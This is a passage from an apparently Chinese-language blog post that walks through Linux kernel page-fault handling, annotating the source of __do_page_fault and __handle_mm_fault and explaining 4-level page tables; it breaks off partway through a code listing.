id="缺页异常-page-fault"><a href="#缺页异常-page-fault" class="headerlink" title="缺页异常 page fault"></a>缺页异常 page fault</h2><p>当操作系统尝试访问存储器中的页面（页）时，如果该页当前不在主存（<strong>RAM</strong>）中，就会发生缺页异常（<strong>page fault</strong>）。缺页异常通常是由于以下几种情况引起的：</p><ol><li><strong>页面不在内存中</strong>：当程序需要访问一个页面，而该页面尚未加载到内存中时。这可能是因为页面曾经在内存中，但已经被换出到磁盘上，或者是因为程序访问了一个新的页面。</li><li><strong>非法访问</strong>：程序尝试访问未被分配给它的内存区域，或者访问已经被释放的内存区域。</li><li><strong>页面保护</strong>：程序尝试写入只读的内存区域，或者执行未被允许的操作。</li></ol><h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__do_page_fault</span>()<br><span class="hljs-built_in">handle_mm_fault</span>()<br><span class="hljs-built_in">__handle_mm_fault</span>()<br><span class="hljs-built_in">handle_pte_fault</span>()<br><span class="hljs-built_in">do_fault</span>()<br><span class="hljs-built_in">do_cow_fault</span>()<br><span class="hljs-built_in">do_wp_page</span>()<br><br></code></pre></td></tr></table></figure><h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a>__do_page_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This routine handles page faults.  It determines the address,</span><br><span class="hljs-comment"> * and the problem, and then passes it off to one of the appropriate</span><br><span class="hljs-comment"> * routines.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function must have noinline because both callers</span><br><span class="hljs-comment"> * &#123;,trace_&#125;do_page_fault() have notrace on. Having this an actual function</span><br><span class="hljs-comment"> * guarantees there&#x27;s a function trace entry.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> noinline <span class="hljs-type">void</span><br>__do_page_fault(<span class="hljs-keyword">struct</span> pt_regs *regs, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> error_code,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address)<br>    <span class="hljs-comment">/*struct pt_regs *regs：保存了页面错误发生时的 CPU 寄存器状态。</span><br><span class="hljs-comment">  unsigned long error_code：错误代码，用于指示页面错误的类型。</span><br><span class="hljs-comment">  unsigned long address：引发页面错误的内存地址。*/</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">tsk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br><span class="hljs-type">int</span> fault, major = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;<br><br>    <span class="hljs-comment">/*从当前任务结构中获取内存管理结构 mm，并通过该结构找到触发页面故障的地址所属的内存区域 vma*/</span><br>tsk = current;<br>mm = tsk-&gt;mm;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Detect and handle instructions that would cause a page fault for</span><br><span class="hljs-comment"> * both a tracked kernel page and a userspace page.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (kmemcheck_active(regs))<br>kmemcheck_hide(regs);<br>prefetchw(&amp;mm-&gt;mmap_sem);<br><br><span class="hljs-keyword">if</span> (unlikely(kmmio_fault(regs, address)))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We fault-in kernel-space virtual memory on-demand. The</span><br><span class="hljs-comment"> * &#x27;reference&#x27; page table is init_mm.pgd.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NOTE! We MUST NOT take any locks for this case. We may</span><br><span class="hljs-comment"> * be in an interrupt or a critical region, and should</span><br><span class="hljs-comment"> * only copy the information from the master page table,</span><br><span class="hljs-comment"> * nothing more.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This verifies that the fault happens in kernel space</span><br><span class="hljs-comment"> * (error_code &amp; 4) == 0, and that the fault was not a</span><br><span class="hljs-comment"> * protection error (error_code &amp; 9) == 0.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;        <span class="hljs-comment">/*检查触发页面故障的地址是否位于内核空间。但这边不太可能发生缺页，所以用unlikely宏优化？*/</span><br><span class="hljs-keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;<span class="hljs-comment">/*三个标志位：使用了页表项保留的标志位、用户空间页异常、页保护异常，三个标志位都无说明是由内核触发的内核空间的缺页异常*/</span><br><span class="hljs-keyword">if</span> (vmalloc_fault(address) &gt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (kmemcheck_fault(regs, address, error_code))<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* Can handle a stale RO-&gt;RW TLB: */</span><br><span class="hljs-keyword">if</span> (spurious_fault(error_code, address))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span><br><span class="hljs-keyword">if</span> (kprobes_fault(regs))<br><span class="hljs-keyword">return</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span><br><span class="hljs-comment"> * fault we could otherwise deadlock:</span><br><span class="hljs-comment"> */</span><br>bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">/*发生了一个不可恢复的页面故障，直接kill*/</span><br><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span><br><span class="hljs-keyword">if</span> (unlikely(kprobes_fault(regs)))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (unlikely(error_code &amp; PF_RSVD))<br>pgtable_bad(regs, error_code, address);<br><br><span class="hljs-keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;<span class="hljs-comment">/*smap，直接gg*/</span><br>bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we&#x27;re in an interrupt, have no user context or are running</span><br><span class="hljs-comment"> * in a region with pagefaults disabled then we must not take the fault</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;<br>bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span><br><span class="hljs-comment"> * vmalloc fault has been handled.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * User-mode registers count as a user access even for any</span><br><span class="hljs-comment"> * potential system fault or CPU buglet:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (user_mode(regs)) &#123; <span class="hljs-comment">/*生缺页异常时的寄存器状态为用户态下的*/</span><br>local_irq_enable();<br>error_code |= PF_USER;<br>flags |= FAULT_FLAG_USER;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)<br>local_irq_enable();<br>&#125;<br><br>perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="hljs-number">1</span>, regs, address);<br><br><span class="hljs-keyword">if</span> (error_code &amp; PF_WRITE)<br>flags |= FAULT_FLAG_WRITE;<br><span class="hljs-keyword">if</span> (error_code &amp; PF_INSTR)<br>flags |= FAULT_FLAG_INSTRUCTION;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When running in the kernel we expect faults to occur only to</span><br><span class="hljs-comment"> * addresses in user space.  All other faults represent errors in</span><br><span class="hljs-comment"> * the kernel and should generate an OOPS.  Unfortunately, in the</span><br><span class="hljs-comment"> * case of an erroneous fault occurring in a code path which already</span><br><span class="hljs-comment"> * holds mmap_sem we will deadlock attempting to validate the fault</span><br><span class="hljs-comment"> * against the address space.  Luckily the kernel only validly</span><br><span class="hljs-comment"> * references user space from well defined areas of code, which are</span><br><span class="hljs-comment"> * listed in the exceptions table.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * As the vast majority of faults will be valid we will only perform</span><br><span class="hljs-comment"> * the source reference check when there is a possibility of a</span><br><span class="hljs-comment"> * deadlock. Attempt to lock the address space, if we cannot we then</span><br><span class="hljs-comment"> * validate the source. If this is invalid we can skip the address</span><br><span class="hljs-comment"> * space check, thus avoiding the deadlock:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;<br><span class="hljs-keyword">if</span> ((error_code &amp; PF_USER) == <span class="hljs-number">0</span> &amp;&amp;<br>    !search_exception_tables(regs-&gt;ip)) &#123;<br>bad_area_nosemaphore(regs, error_code, address, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>retry:<br>down_read(&amp;mm-&gt;mmap_sem);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The above down_read_trylock() might have succeeded in</span><br><span class="hljs-comment"> * which case we&#x27;ll have missed the might_sleep() from</span><br><span class="hljs-comment"> * down_read():</span><br><span class="hljs-comment"> */</span><br>might_sleep();<br>&#125;<br><br>vma = find_vma(mm, address);<br><span class="hljs-keyword">if</span> (unlikely(!vma)) &#123;<br>bad_area(regs, error_code, address);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))<span class="hljs-comment">/*检查触发页面故障的地址是否在当前进程的内存映射区域内*/</span><br><span class="hljs-keyword">goto</span> good_area;<br><span class="hljs-keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;<br>bad_area(regs, error_code, address);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (error_code &amp; PF_USER) &#123;<span class="hljs-comment">/*缺页异常地址位于用户空间*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Accessing the stack below %sp is always a bug.</span><br><span class="hljs-comment"> * The large cushion allows instructions like enter</span><br><span class="hljs-comment"> * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span><br><span class="hljs-comment"> * 32 pointers and then decrements %sp by 65535.)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(address + <span class="hljs-number">65536</span> + <span class="hljs-number">32</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) &lt; regs-&gt;sp)) &#123;<br>bad_area(regs, error_code, address);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;<span class="hljs-comment">/*调用 expand_stack() 函数尝试扩展栈区*/</span><br>bad_area(regs, error_code, address);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ok, we have a good vm_area for this memory access, so</span><br><span class="hljs-comment"> * we can handle it..</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*运行到这里，说明是正常的缺页异常，addr属于进程的地址空间，此时进行请求调页，分配物理内存*/</span><br>good_area:<br><span class="hljs-keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;<br>bad_area_access_error(regs, error_code, address, vma);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If for any reason at all we couldn&#x27;t handle the fault,</span><br><span class="hljs-comment"> * make sure we exit gracefully rather than endlessly redo</span><br><span class="hljs-comment"> * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span><br><span class="hljs-comment"> * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">/*核心function*/</span><br>fault = handle_mm_fault(vma, address, flags);<br>major |= fault &amp; VM_FAULT_MAJOR;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we need to retry the mmap_sem has already been released,</span><br><span class="hljs-comment"> * and if there is a fatal signal pending there is no guarantee</span><br><span class="hljs-comment"> * that we made any progress. Handle this case first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;<br><span class="hljs-comment">/* Retry at most once */</span><br><span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;<br>flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;<br>flags |= FAULT_FLAG_TRIED;<br><span class="hljs-keyword">if</span> (!fatal_signal_pending(tsk))<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-comment">/* User mode? Just return to handle the fatal exception */</span><br><span class="hljs-keyword">if</span> (flags &amp; FAULT_FLAG_USER)<span class="hljs-comment">/*用户态触发用户地址空间缺页异常，交由上层函数处理了*/</span><br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">/* Not returning to user mode? Handle exceptions or die: */</span><br>no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>up_read(&amp;mm-&gt;mmap_sem);<span class="hljs-comment">/*释放内存管理结构的读锁*/</span><br><span class="hljs-keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;<br>mm_fault_error(regs, error_code, address, vma, fault);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Major/minor page fault accounting. If any of the events</span><br><span class="hljs-comment"> * returned VM_FAULT_MAJOR, we account it as a major fault.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (major) &#123;<span class="hljs-comment">/*如果页面故障被标记为 Major，则增加任务的 maj_flt 计数器；否则，增加 min_flt 计数器*/</span><br>tsk-&gt;maj_flt++;<br>perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="hljs-number">1</span>, regs, address);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>tsk-&gt;min_flt++;<br>perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="hljs-number">1</span>, regs, address);<span class="hljs-comment">/*记录页面故障事件，用于性能统计*/</span><br>&#125;<br><br>check_v8086_mode(regs, address, tsk);<br>&#125;<br>NOKPROBE_SYMBOL(__do_page_fault);<br></code></pre></td></tr></table></figure><p>A3👴总结的流程如下：</p><ul><li>判断缺页异常地址位于用户地址空间还是内核地址空间</li><li>位于内核地址空间<ul><li>内核态触发缺页异常，<code>vmalloc_fault()</code> 处理</li><li>用户态触发缺页异常，段错误，发送<code>SIGSEGV</code>信号</li></ul></li><li>位于用户地址空间<ul><li>内核态触发缺页异常<ul><li><code>SMAP</code>保护已开启，终止进程</li><li>进程无地址空间 | 设置了不处理缺页异常，终止进程</li><li>进入下一步流程</li></ul></li><li>用户态触发缺页异常<ul><li>设置对应标志位，进入下一步流程</li></ul></li><li>检查是否是写页异常，可能是页不存在&#x2F;无权限写，设置对应标志位</li><li>找寻线性地址所属的线性区（<strong>vma</strong>）[1]<ul><li>不存在对应<code>vma</code>，非法访问</li><li>存在对应<code>vma</code>，且位于<code>vma</code>所描述区域中，进入下一步流程</li><li>存在对应<code>vma</code>，不位于<code>vma</code>所描述区域中，说明可能是位于堆栈（<strong>stack</strong>），尝试增长堆栈</li></ul></li><li>✳调用<code>handle_mm_fault()</code>函数处理，这也是处理缺页异常的核心函数<ul><li>失败了，进行重试（返回到[1]，只会重试一次）</li><li>其他收尾处理</li></ul></li></ul></li></ul><h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="__handle_mm_fault"></a>__handle_mm_fault</h4><p><del>总8会有人连4级页表还不知道吧</del></p><p>在<code>Linux</code>中，虚拟内存管理采用了多级页表的方式来实现。在x86架构下，<code>Linux</code>使用了4级页表（<strong>4-level paging</strong>），也称为多级页表（<strong>multilevel paging</strong>）或者分层页表（<strong>hierarchical paging</strong>）。</p><p>4级页表是指由四个级别的页表组成的层次结构，每个级别的页表负责将虚拟地址映射到物理地址的不同部分。这些级别依次为：</p><ol><li><strong>页全局目录表（Page Global Directory，PGD）</strong>：第一级页表，用于将虚拟地址转换为页上级目录表（<strong>Page Upper Directory，PUD</strong>）的索引。</li><li><strong>页上级目录表（Page Upper Directory，PUD）</strong>：第二级页表，用于将虚拟地址转换为页中间目录表（<strong>Page Middle Directory，PMD</strong>）的索引。</li><li><strong>页中间目录表（Page Middle Directory，PMD）</strong>：第三级页表，用于将虚拟地址转换为页表（<strong>Page Table，PT</strong>）的索引。</li><li><strong>页表（Page Table，PTE）</strong>：第四级页表，用于将虚拟地址转换为物理地址。</li></ol><p>再要认识一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_env</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><span class="hljs-comment">/* Target VMA */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address;<span class="hljs-comment">/* Faulting virtual address */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<span class="hljs-comment">/* FAULT_FLAG_xxx flags */</span><br><span class="hljs-type">pmd_t</span> *pmd;<span class="hljs-comment">/* Pointer to pmd entry matching</span><br><span class="hljs-comment"> * the &#x27;address&#x27;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">pte_t</span> *pte;<span class="hljs-comment">/* Pointer to pte entry matching</span><br><span class="hljs-comment"> * the &#x27;address&#x27;. NULL if the page</span><br><span class="hljs-comment"> * table hasn&#x27;t been allocated.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">spinlock_t</span> *ptl;<span class="hljs-comment">/* Page table lock.</span><br><span class="hljs-comment"> * Protects pte page table if &#x27;pte&#x27;</span><br><span class="hljs-comment"> * is not NULL, otherwise pmd.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">pgtable_t</span> prealloc_pte;<span class="hljs-comment">/* Pre-allocated pte page table.</span><br><span class="hljs-comment"> * vm_ops-&gt;map_pages() calls</span><br><span class="hljs-comment"> * alloc_set_pte() from atomic context.</span><br><span class="hljs-comment"> * do_fault_around() pre-allocates</span><br><span class="hljs-comment"> * page table to avoid allocation from</span><br><span class="hljs-comment"> * atomic context.</span><br><span class="hljs-comment"> */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __handle_mm_fault(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_env</span> <span class="hljs-title">fe</span> =</span> &#123;<span class="hljs-comment">//创建一个 fault_env 结构体 fe，其中包含了 vma、address 和 flags 等信息</span><br>.vma = vma,<br>.address = address,<br>.flags = flags,<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-type">pgd_t</span> *pgd;<span class="hljs-comment">//页全局目录项</span><br><span class="hljs-type">pud_t</span> *pud;<span class="hljs-comment">//页上级目录项</span><br><br>pgd = pgd_offset(mm, address);<span class="hljs-comment">//获取全局页表项</span><br>pud = pud_alloc(mm, pgd, address);<span class="hljs-comment">//获取页上级目录项</span><br><span class="hljs-keyword">if</span> (!pud)<span class="hljs-comment">//获取页上级目录项失败，gg</span><br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br>fe.pmd = pmd_alloc(mm, pud, address);<span class="hljs-comment">//获取页中级目录项</span><br><span class="hljs-keyword">if</span> (!fe.pmd)<span class="hljs-comment">//获取页中级目录项失败，gg</span><br><span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><span class="hljs-keyword">if</span> (pmd_none(*fe.pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;<span class="hljs-comment">/*页面的页表项为空且透明大页已启用，那么它会调用 create_huge_pmd 函数尝试创建一个大页。这个函数的目的是尝试将多个物理页映射到一个大页上，从而提高内存访问效率。8懂，chat的*/</span><br><span class="hljs-type">int</span> ret = create_huge_pmd(&amp;fe);<br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<span class="hljs-comment">/*gg*/</span><br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">pmd_t</span> orig_pmd = *fe.pmd;<br><span class="hljs-type">int</span> ret;<br><br>barrier();<br><span class="hljs-keyword">if</span> (pmd_trans_huge(orig_pmd) || pmd_devmap(orig_pmd)) &#123;<br><span class="hljs-keyword">if</span> (pmd_protnone(orig_pmd) &amp;&amp; vma_is_accessible(vma))<br><span class="hljs-keyword">return</span> do_huge_pmd_numa_page(&amp;fe, orig_pmd);<br><br><span class="hljs-keyword">if</span> ((fe.flags &amp; FAULT_FLAG_WRITE) &amp;&amp;<br>!pmd_write(orig_pmd)) &#123;<br>ret = wp_huge_pmd(&amp;fe, orig_pmd);<br><span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<br><span class="hljs-keyword">return</span> ret;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>huge_pmd_set_accessed(&amp;fe, orig_pmd);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> 